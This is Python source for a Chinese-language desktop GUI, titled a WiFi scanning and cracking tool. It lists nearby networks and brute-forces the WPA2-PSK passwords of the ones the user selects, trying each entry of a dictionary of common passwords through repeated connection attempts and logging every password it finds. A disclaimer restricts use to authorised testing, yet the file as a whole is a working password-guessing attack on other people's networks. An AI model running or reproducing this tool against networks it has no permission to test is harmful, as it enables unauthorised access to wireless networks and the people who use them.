import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext
import pywifi
from pywifi import const
import time
import threading
import os
import base64

class WifiCracker:
    def __init__(self, root):
        self.root = root
        self.root.title("WIFI扫描与破解工具 v1.0")
        self.root.geometry("1200x800")
        
        # Show security warning first
        if not self.show_security_warning():
            self.root.destroy()
            return
            
        self.wifi = pywifi.PyWiFi()
        self.iface = self.wifi.interfaces()[0]
        
        # Speed settings (delay in seconds)
        self.speed_settings = {
            "低速": 1.0,
            "中速": 0.5,
            "高速": 0.1
        }
        self.speed_warnings = {
            "低速": "低速模式：速度较慢，但稳定性最好，不易漏过正确密码",
            "中速": "中速模式：速度和稳定性均衡，推荐使用",
            "高速": "警告：高速模式下稳定性较差，可能会漏过正确密码！"
        }
        self.current_speed = "中速"
        
        self.setup_gui()
        self.wifi_list = []
        self.selected_wifis = set()
        self.is_cracking = False
        
    def setup_gui(self):
        # Create main vertical paned window
        main_paned = ttk.PanedWindow(self.root, orient=tk.VERTICAL)
        main_paned.pack(fill=tk.BOTH, expand=True)

        # Add menu bar
        menubar = tk.Menu(self.root)
        self.root.config(menu=menubar)
        
        # Add Help menu
        help_menu = tk.Menu(menubar, tearoff=0)
        menubar.add_cascade(label="帮助", menu=help_menu)
        help_menu.add_command(label="联系作者", command=self.show_contact)

        # Top section for WiFi and dictionary management
        top_paned = ttk.PanedWindow(main_paned, orient=tk.HORIZONTAL)
        main_paned.add(top_paned)

        # Bottom section for logs
        bottom_frame = ttk.Frame(main_paned)
        main_paned.add(bottom_frame)

        # === Top Left: WiFi List Section ===
        wifi_frame = ttk.LabelFrame(top_paned, text="WiFi 列表")
        top_paned.add(wifi_frame, weight=3)

        # Scan button and speed control in one row
        control_frame = ttk.Frame(wifi_frame)
        control_frame.pack(fill=tk.X, padx=5, pady=5)

        scan_btn = ttk.Button(control_frame, text="扫描WiFi", command=self.scan_wifi)
        scan_btn.pack(side=tk.LEFT, padx=5)

        # Speed control in a labeled frame
        speed_frame = ttk.LabelFrame(control_frame, text="破解速度")
        speed_frame.pack(side=tk.RIGHT, padx=5)
        
        self.speed_var = tk.StringVar(value=self.current_speed)
        self.speed_var.trace('w', self.on_speed_change)
        
        for speed in ["低速", "中速", "高速"]:
            ttk.Radiobutton(speed_frame, text=speed, value=speed, 
                          variable=self.speed_var).pack(side=tk.LEFT, padx=5)

        # WiFi list with scrollbar
        list_frame = ttk.Frame(wifi_frame)
        list_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # 创建样式
        style = ttk.Style()
        style.configure("Treeview", rowheight=25)  # 增加行高以适应复选框
        
        self.tree = ttk.Treeview(list_frame, columns=("check", "ssid", "bssid", "signal", "encryption"), show="headings")
        
        # Configure column headings with sort functionality
        self.tree.heading("check", text="选择", command=lambda: self.treeview_sort_column("check", False))
        self.tree.heading("ssid", text="WiFi名称", command=lambda: self.treeview_sort_column("ssid", False))
        self.tree.heading("bssid", text="BSSID", command=lambda: self.treeview_sort_column("bssid", False))
        self.tree.heading("signal", text="信号强度", command=lambda: self.treeview_sort_column("signal", False))
        self.tree.heading("encryption", text="加密方式", command=lambda: self.treeview_sort_column("encryption", False))
        
        self.tree.column("check", width=50, anchor="center")
        self.tree.column("ssid", width=200)
        self.tree.column("bssid", width=150)
        self.tree.column("signal", width=100)
        self.tree.column("encryption", width=150)
        
        # 创建复选框变量字典
        self.checkbuttons = {}
        
        self.tree.bind('<Button-1>', self.handle_click)
        
        scrollbar = ttk.Scrollbar(list_frame, orient=tk.VERTICAL, command=self.tree.yview)
        self.tree.configure(yscrollcommand=scrollbar.set)
        
        self.tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)

        # Control buttons and progress section
        control_section = ttk.Frame(wifi_frame)
        control_section.pack(fill=tk.X, padx=5, pady=5)

        button_frame = ttk.Frame(control_section)
        button_frame.pack(fill=tk.X)

        self.crack_button = ttk.Button(button_frame, text="开始破解选中WiFi", command=self.start_crack)
        self.crack_button.pack(side=tk.LEFT, padx=5)
        
        self.stop_button = ttk.Button(button_frame, text="停止破解", command=self.stop_crack, state='disabled')
        self.stop_button.pack(side=tk.LEFT, padx=5)

        # Progress section
        progress_frame = ttk.LabelFrame(control_section, text="破解进度")
        progress_frame.pack(fill=tk.X, pady=(5, 0))
        
        self.progress_var = tk.DoubleVar()
        self.progress_bar = ttk.Progressbar(progress_frame, variable=self.progress_var, maximum=100)
        self.progress_bar.pack(fill=tk.X, padx=5, pady=2)
        
        self.progress_label = ttk.Label(progress_frame, text="等待开始破解...")
        self.progress_label.pack(pady=2)

        # === Top Right: Dictionary Management Section ===
        dict_frame = ttk.LabelFrame(top_paned, text="密码字典")
        top_paned.add(dict_frame, weight=1)
        
        self.dict_text = scrolledtext.ScrolledText(dict_frame, width=30)
        self.dict_text.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # 创建默认字典并加载
        if not os.path.exists("password.txt"):
            self.create_default_dictionary()
        self.load_dictionary()
        
        save_dict_btn = ttk.Button(dict_frame, text="保存密码字典", command=self.save_dictionary)
        save_dict_btn.pack(padx=5, pady=(0, 5))

        # === Bottom: Logs Section ===
        logs_paned = ttk.PanedWindow(bottom_frame, orient=tk.HORIZONTAL)
        logs_paned.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Real-time logs (left side)
        realtime_frame = ttk.LabelFrame(logs_paned, text="实时日志")
        logs_paned.add(realtime_frame, weight=2)
        
        self.log_area = scrolledtext.ScrolledText(realtime_frame, height=8)
        self.log_area.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Success logs (right side)
        success_frame = ttk.LabelFrame(logs_paned, text="破解成功记录")
        logs_paned.add(success_frame, weight=1)
        
        self.log_tree = ttk.Treeview(success_frame, columns=("timestamp", "ssid", "password"), show="headings", height=6)
        
        self.log_tree.heading("timestamp", text="时间")
        self.log_tree.heading("ssid", text="WiFi名称")
        self.log_tree.heading("password", text="密码")
        
        self.log_tree.column("timestamp", width=120)
        self.log_tree.column("ssid", width=150)
        self.log_tree.column("password", width=150)
        
        success_scrollbar = ttk.Scrollbar(success_frame, orient=tk.VERTICAL, command=self.log_tree.yview)
        self.log_tree.configure(yscrollcommand=success_scrollbar.set)
        
        self.log_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        success_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)

    def get_encryption_type(self, akm):
        if not akm:
            return "Open"
        elif akm[0] == const.AKM_TYPE_WPA2PSK:
            return "WPA2-PSK"
        elif akm[0] == const.AKM_TYPE_WPAPSK:
            return "WPA-PSK"
        elif akm[0] == const.AKM_TYPE_WPA2:
            return "WPA2"
        elif akm[0] == const.AKM_TYPE_WPA:
            return "WPA"
        else:
            return "Unknown"
            
    def calculate_signal_strength(self, signal):
        signal_percent = 2 * (signal + 100)
        return min(max(signal_percent, 0), 100)  

    def handle_click(self, event):
        region = self.tree.identify("region", event.x, event.y)
        
        if region == "cell":
            column = self.tree.identify_column(event.x)
            item = self.tree.identify_row(event.y)
            if column == "#1" and item:
                values = list(self.tree.item(item, "values"))
                ssid = values[1]
                
                # 切换复选框状态
                if ssid in self.checkbuttons:
                    current_state = self.checkbuttons[ssid].get()
                    new_state = not current_state
                    self.checkbuttons[ssid].set(new_state)
                    
                    if new_state:
                        self.selected_wifis.add(ssid)
                        values[0] = "☑"
                    else:
                        self.selected_wifis.remove(ssid)
                        values[0] = "☐"
                        
                    self.tree.item(item, values=values)
                return "break"

    def scan_wifi(self):
        for item in self.tree.get_children():
            self.tree.delete(item)
        self.wifi_list.clear()
        self.selected_wifis.clear()
        self.checkbuttons.clear()  # 清除复选框变量
        
        print("开始扫描WiFi...")
        self.iface.scan()
        time.sleep(2)
        
        results = self.iface.scan_results()
        if not results:
            print("未找到任何WiFi网络")
            return
            
        # Create a dictionary to store unique WiFi networks with best signal strength
        unique_networks = {}
        for result in results:
            if result.ssid:
                signal_strength = self.calculate_signal_strength(result.signal)
                # Only keep the stronger signal if duplicate SSID
                if result.ssid not in unique_networks or signal_strength > self.calculate_signal_strength(unique_networks[result.ssid].signal):
                    unique_networks[result.ssid] = result
        
        print(f"找到 {len(unique_networks)} 个WiFi网络:")
        for result in unique_networks.values():
            self.wifi_list.append(result)
            signal_strength = self.calculate_signal_strength(result.signal)
            encryption = self.get_encryption_type(result.akm)
            
            # 为每个WiFi创建一个复选框变量
            var = tk.BooleanVar()
            self.checkbuttons[result.ssid] = var
            
            # Handle BSSID formatting
            try:
                if isinstance(result.bssid, bytes):
                    bssid = ":".join([f"{b:02x}" for b in result.bssid]).upper()
                else:
                    bssid = result.bssid
                    
                self.tree.insert("", "end", values=("☐", result.ssid, bssid, f"{signal_strength}%", encryption))
                print(f"SSID: {result.ssid}, 信号强度: {signal_strength}%, 加密方式: {encryption}")
            except Exception as e:
                print(f"处理WiFi信息时出错: {str(e)}")

    def try_connect(self, ssid, password):
        profile = pywifi.Profile()
        profile.ssid = ssid
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = password
        
        self.iface.remove_all_network_profiles()
        tmp_profile = self.iface.add_network_profile(profile)
        
        self.iface.connect(tmp_profile)
        time.sleep(3)  
        
        if self.iface.status() == const.IFACE_CONNECTED:
            self.iface.disconnect()  
            return True
        else:
            self.iface.disconnect()  
            return False

    def load_dictionary(self):
        try:
            with open("password.txt", 'r', encoding='utf-8') as f:
                content = f.read()
                self.dict_text.delete('1.0', tk.END)
                self.dict_text.insert('1.0', content)
                self.dict_text.edit_modified(False)  # 重置修改状态
        except FileNotFoundError:
            self.create_default_dictionary()
            self.load_dictionary()

    def save_dictionary(self, show_message=True):
        content = self.dict_text.get('1.0', tk.END).strip().split('\n')
        unique_passwords = list(dict.fromkeys(filter(None, map(str.strip, content))))
        
        with open("password.txt", 'w', encoding='utf-8') as f:
            f.write('\n'.join(unique_passwords))
            
        self.dict_text.delete('1.0', tk.END)
        self.dict_text.insert('1.0', '\n'.join(unique_passwords))
        self.dict_text.edit_modified(False)  # 重置修改状态
        
        if show_message:
            messagebox.showinfo("成功", "密码字典已保存！")

    def create_default_dictionary(self):
        default_passwords = [
            "12345678",
            "password",
            "88888888",
            "admin123",
            "password123",
            "11111111",
            "00000000"
        ]
        with open("password.txt", "w", encoding='utf-8') as f:
            f.write("\n".join(default_passwords))
            
    def start_crack(self):
        if not self.selected_wifis:
            messagebox.showwarning("警告", "请先选择要破解的WiFi")
            return
            
        if self.is_cracking:
            messagebox.showwarning("警告", "正在破解中，请等待完成")
            return
            
        self.save_dictionary(show_message=False)
        
        # Get total work to be done
        passwords = list(dict.fromkeys(
            filter(None, map(str.strip, 
                self.dict_text.get('1.0', tk.END).strip().split('\n')
            ))
        ))
        selected_wifi_count = len(self.selected_wifis)
        self.total_attempts = len(passwords) * selected_wifi_count
        self.current_attempt = 0
        
        # Reset progress
        self.progress_var.set(0)
        self.progress_label.config(text=f"准备开始破解 {selected_wifi_count} 个WiFi网络...")
        
        self.crack_button.configure(state='disabled')
        self.stop_button.configure(state='normal')
        
        self.is_cracking = True
        threading.Thread(target=self.process_selected_wifi, daemon=True).start()

    def update_progress(self, current_wifi_name, current_password):
        self.current_attempt += 1
        progress = (self.current_attempt / self.total_attempts) * 100
        self.progress_var.set(progress)
        self.progress_label.config(
            text=f"总进度: {self.current_attempt}/{self.total_attempts} "
                f"当前WiFi: {current_wifi_name} "
                f"当前密码: {current_password}"
        )

    def crack_single_wifi(self, wifi_profile):
        try:
            ssid = wifi_profile.ssid
            signal_strength = self.calculate_signal_strength(wifi_profile.signal)
            encryption = self.get_encryption_type(wifi_profile.akm)
            
            self.safe_log_print("-" * 50)
            self.safe_log_print(f"开始破解WiFi:")
            self.safe_log_print(f"SSID: {ssid}")
            self.safe_log_print(f"信号强度: {signal_strength}%")
            self.safe_log_print(f"加密方式: {encryption}")
            self.safe_log_print(f"当前速度: {self.speed_var.get()}")
            self.safe_log_print("-" * 50)
            
            passwords = list(dict.fromkeys(
                filter(None, map(str.strip, 
                    self.dict_text.get('1.0', tk.END).strip().split('\n')
                ))
            ))
            
            total_passwords = len(passwords)
            self.safe_log_print(f"共加载 {total_passwords} 个不重复密码")
            
            for index, password in enumerate(passwords, 1):
                if not self.is_cracking:
                    return
                    
                self.root.after(0, lambda s=ssid, p=password: 
                              self.update_progress(s, p))
                self.safe_log_print(f"正在尝试密码 ({index}/{total_passwords}): {password}")
                
                if self.try_connect(ssid, password):
                    success_msg = f"破解成功!\nSSID: {ssid}\n密码: {password}"
                    self.safe_log_print("=" * 50)
                    self.safe_log_print(success_msg)
                    self.safe_log_print("=" * 50)
                    self.root.after(0, lambda: self.add_success_log(ssid, password))
                    return
                    
                # Use the selected speed setting
                time.sleep(self.speed_settings[self.speed_var.get()])
            
            self.safe_log_print("=" * 50)
            self.safe_log_print(f"破解失败: {ssid}")
            self.safe_log_print(f"已尝试 {total_passwords} 个密码，均未成功")
            self.safe_log_print("=" * 50)
            
        except Exception as e:
            self.safe_log_print(f"破解过程出错: {str(e)}")

    def process_selected_wifi(self):
        try:
            total_selected = len(self.selected_wifis)
            current_wifi = 0
            
            for wifi_profile in self.wifi_list:
                if not self.is_cracking:
                    break
                if wifi_profile.ssid in self.selected_wifis:
                    current_wifi += 1
                    self.progress_label.config(
                        text=f"正在破解第 {current_wifi}/{total_selected} 个WiFi: {wifi_profile.ssid}"
                    )
                    self.crack_single_wifi(wifi_profile)
        finally:
            self.is_cracking = False
            self.root.after(0, lambda: self.stop_button.configure(state='disabled'))
            self.root.after(0, lambda: self.crack_button.configure(state='normal'))
            if self.current_attempt >= self.total_attempts:
                self.root.after(0, lambda: self.progress_label.config(text="破解完成"))
            else:
                self.root.after(0, lambda: self.progress_label.config(text="破解已停止"))

    def stop_crack(self):
        self.is_cracking = False
        self.safe_log_print("\n破解过程已停止...")
        self.stop_button.configure(state='disabled')
        self.crack_button.configure(state='normal')
        self.progress_label.config(text="破解已停止")

    def enable_crack_button(self):
        if hasattr(self, 'crack_button'):
            self.crack_button.configure(state='normal')

    def safe_log_print(self, message):
        """Print message to the real-time log area"""
        if not self.root.winfo_exists():
            return
        self.root.after(0, lambda: self.log_area.insert(tk.END, f"{message}\n"))
        self.root.after(0, lambda: self.log_area.see(tk.END))

    def log_print(self, message):
        """Only used for internal logging, not displayed in GUI"""
        print(message)

    def add_success_log(self, ssid, password):
        """Add successful crack to the log Treeview"""
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        self.root.after(0, lambda: self.log_tree.insert("", 0, values=(timestamp, ssid, password)))

    def show_success_popup(self, ssid, password):
        pass

    def on_speed_change(self, *args):
        """Called when user changes the speed setting"""
        new_speed = self.speed_var.get()
        if new_speed in self.speed_warnings:
            self.safe_log_print("\n" + "=" * 50)
            self.safe_log_print(self.speed_warnings[new_speed])
            self.safe_log_print("=" * 50 + "\n")
            
            # For high speed, also show a popup warning
            if new_speed == "高速":
                messagebox.showwarning("速度警告", self.speed_warnings[new_speed])
                
    def treeview_sort_column(self, col, reverse):
        """Sort treeview column when clicked."""
        l = [(self.tree.set(k, col), k) for k in self.tree.get_children('')]
        
        # Convert signal strength to number for proper sorting
        if col == "signal":
            l = [(float(v[0].rstrip('%')), v[1]) if v[0].rstrip('%').replace('.','',1).isdigit() else (0, v[1]) for v in l]
        
        l.sort(reverse=reverse)
        
        # Rearrange items in sorted positions
        for index, (val, k) in enumerate(l):
            self.tree.move(k, '', index)
        
        # Switch the heading so that it will sort in the opposite direction next time
        self.tree.heading(col, command=lambda: self.treeview_sort_column(col, not reverse))

    def show_contact(self):
        contact_text = """
作者微信: """ + base64.b64decode("c3JjLWFsbA==").decode() + """

欢迎交流和反馈！
        """
        messagebox.showinfo("联系作者", contact_text)

    def show_security_warning(self):
        warning_text = """
安全警告和免责声明

本工具仅供以下用途：
1. 网络安全教育和研究
2. 测试自己拥有的WiFi网络安全性
3. 经过网络所有者明确授权的安全测试

严禁用于：
1. 未经授权访问他人网络
2. 任何非法或恶意用途
3. 破坏或干扰网络服务

继续使用即表示您同意：
1. 仅将本工具用于合法目的
2. 承担使用本工具的所有风险和责任
3. 遵守相关法律法规

您确定要继续使用吗？
        """
        
        result = messagebox.askokcancel(
            "安全警告",
            warning_text,
            icon='warning'
        )
        return result

if __name__ == "__main__":
    root = tk.Tk()
    app = WifiCracker(root)
    root.mainloop()
